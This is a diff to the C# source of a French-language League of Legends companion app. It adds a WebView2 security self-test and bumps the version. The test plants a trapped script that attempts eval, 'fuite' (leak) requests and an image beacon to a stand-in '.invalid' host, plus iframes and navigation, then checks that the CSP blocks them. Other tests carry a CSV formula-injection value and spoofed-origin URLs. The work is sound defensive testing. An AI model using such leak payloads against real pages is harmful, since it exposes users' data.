@@ -22,8 +22,8 @@ using Microsoft.Web.WebView2.WinForms;
 [assembly: AssemblyTitle("DRAFT")]
 [assembly: AssemblyDescription("DRAFT : ton assistant stratégique pour League of Legends. Non approuvé par Riot Games.")]
 [assembly: AssemblyProduct("DRAFT")]
-[assembly: AssemblyVersion("2.16.0.0")]
-[assembly: AssemblyFileVersion("2.16.0.0")]
+[assembly: AssemblyVersion("2.16.1.0")]
+[assembly: AssemblyFileVersion("2.16.1.0")]
 
 namespace DraftMid
 {
@@ -1322,6 +1322,52 @@ public static class Autostart
             return "";
         }
 
+        // Protections de la page, vérifiées dans la vraie WebView2 : CSP réellement appliquée, eval interdit,
+        // réseau et cadres limités, navigation et fenêtres vers un site inconnu refusées. Aucun accès réseau réel (.invalid).
+        public async Task<string> TestPageSecurity()
+        {
+            OpenFull("");
+            PanelForm f = null;
+            for (int i = 0; i < 300 && !(panels.TryGetValue("full", out f) && f.Visible && f.Ready.IsCompleted && f.View.CoreWebView2 != null); i++) await Task.Delay(50);
+            if (f == null || f.View.CoreWebView2 == null) return "(fenêtre absente)";
+            Func<string, Task<string>> run = async code => await f.View.CoreWebView2.ExecuteScriptAsync(code);
+            string problem = "";
+            string csp = await run("(document.querySelector('meta[http-equiv=\"Content-Security-Policy\"]') || {}).content || ''");
+            if (!csp.Contains("default-src 'none'") || csp.Contains("unsafe-eval") || !csp.Contains("frame-src 'none'")) problem += "(CSP absente ou affaiblie : " + csp + ") ";
+            // Le code injecté par ExecuteScriptAsync est privilégié et échappe à la CSP. On rejoue donc l'attaque d'origine : un draft-stats.js
+            // piégé posé directement dans le dossier de la page, comme si la relecture stricte avait été contournée, puis chargé par la page.
+            // Seule la CSP le retient ici : c'est elle que l'on vérifie, en défense en profondeur.
+            string probe = Path.Combine(webDir, "draft-stats.js");
+            File.WriteAllText(probe, "window.DRAFT_STATS = {\"rows\":[]}; window.__csp = []; document.addEventListener('securitypolicyviolation', e => window.__csp.push(e.effectiveDirective || e.violatedDirective)); " +
+                "try { eval('1'); window.__eval = 'permis'; } catch (e) { window.__eval = 'bloque'; } " +
+                "window.addEventListener('load', () => { fetch('https://exemple.invalid/fuite').catch(() => 0); const i = new Image(); i.src = 'https://exemple.invalid/fuite.png'; " +
+                "const fr = document.createElement('iframe'); fr.src = 'https://exemple.invalid/'; document.body.appendChild(fr); });\n");
+            await run("location.reload(); 1");
+            await Task.Delay(600);
+            string evalResult = "";
+            for (int i = 0; i < 60 && evalResult != "\"bloque\"" && evalResult != "\"permis\""; i++) { evalResult = await run("window.__eval || ''"); await Task.Delay(100); }
+            if (evalResult != "\"bloque\"") problem += "(eval dans un script de la page : " + evalResult + ") ";
+            string seen = "";
+            for (int i = 0; i < 40; i++)
+            {
+                seen = await run("window.__csp.join(',')");
+                if (seen.Contains("connect-src") && seen.Contains("img-src") && seen.Contains("frame-src")) break;
+                await Task.Delay(100);
+            }
+            if (!seen.Contains("connect-src")) problem += "(requête vers un site inconnu non bloquée) ";
+            if (!seen.Contains("img-src")) problem += "(image vers un site inconnu non bloquée) ";
+            if (!seen.Contains("frame-src")) problem += "(cadre vers un site inconnu non bloqué) ";
+            await run("document.querySelectorAll('iframe').forEach(x => x.remove()); window.open('https://exemple.invalid/fenetre'); location.href = 'https://exemple.invalid/navigation'; 1");
+            await Task.Delay(800);
+            string origin = await run("location.origin");
+            if (origin != "\"https://draftmid.local\"") problem += "(navigation vers un site inconnu acceptée : " + origin + ") ";
+            // Remise en état : le fichier de la page redevient la copie relue des données.
+            DataScripts.Publish("draft-stats.js", dataDir, webDir);
+            await run("location.reload(); 1");
+            await Task.Delay(600);
+            return problem;
+        }
+
         async Task<string> TestHistoryWindow(string fakeKey)
         {
             string path = Path.Combine(dataDir, HistoryImporter.FileName), before = File.ReadAllText(path), status = historyStatus, layout = "";
@@ -2036,6 +2082,8 @@ public static class Autostart
             t(profileProblem == "", "Profils par rôle et rôle attribué par LoL, dans la vraie fenêtre " + profileProblem);
             string historyProblem = await app.TestHistoryImport();
             t(historyProblem == "", "Import Riot simulé depuis l'application, sans appel réel, sans trace de clé " + historyProblem);
+            string securityProblem = await app.TestPageSecurity();
+            t(securityProblem == "", "Protections de la page dans la vraie WebView2 : CSP, eval, réseau, cadres, navigation " + securityProblem);
         }
 
         static string s_keyReport = "";
@@ -2429,7 +2477,7 @@ public static class Autostart
             using (RegistryKey k = Registry.CurrentUser.CreateSubKey(o.TestInstall ? TestUninstallKey : UninstallKey))
             {
                 k.SetValue("DisplayName", "DRAFT");
-                k.SetValue("DisplayVersion", "2.16.0");
+                k.SetValue("DisplayVersion", "2.16.1");
                 k.SetValue("Publisher", "DRAFT");
                 k.SetValue("DisplayIcon", target);
                 k.SetValue("InstallLocation", dir);
@@ -2676,6 +2724,7 @@ public static class Autostart
             HistoryImporterTests.Run(t, dataDir);
             AppUpdaterTests.Run(t, dataDir, self);
             DataScriptsTests.Run(t, dataDir);
+            SecurityTests.Run(t);
             t(CompanionApp.IsAppPage("https://draftmid.local/index.html?panel=full") && !CompanionApp.IsAppPage("https://draftmid.local.exemple.test/") && !CompanionApp.IsAppPage("https://draftmid.local@exemple.test/") && !CompanionApp.IsAppPage(null), "Page de confiance : seule l'origine de DRAFT est reconnue");
             t(CompanionApp.AllowedPageLink("https://lolalytics.com/lol/ahri/build/") && !CompanionApp.AllowedPageLink("https://lolalytics.com.exemple.test/") && !CompanionApp.AllowedPageLink("http://lolalytics.com/") && !CompanionApp.AllowedPageLink("https://exemple.test/?q=lolalytics.com") && !CompanionApp.AllowedPageLink("https://user@lolalytics.com/") && !CompanionApp.AllowedPageLink("file:///C:/Windows/"), "Liens de la page : seuls des sites connus, en HTTPS");
             t(CompanionApp.CsvCell("=HYPERLINK(\"x\")") == "'=HYPERLINK(\"x\")" && CompanionApp.CsvCell("+1") == "'+1" && CompanionApp.CsvCell("Ahri") == "Ahri" && CompanionApp.CsvCell("") == "", "Relevé CSV : formules neutralisées");
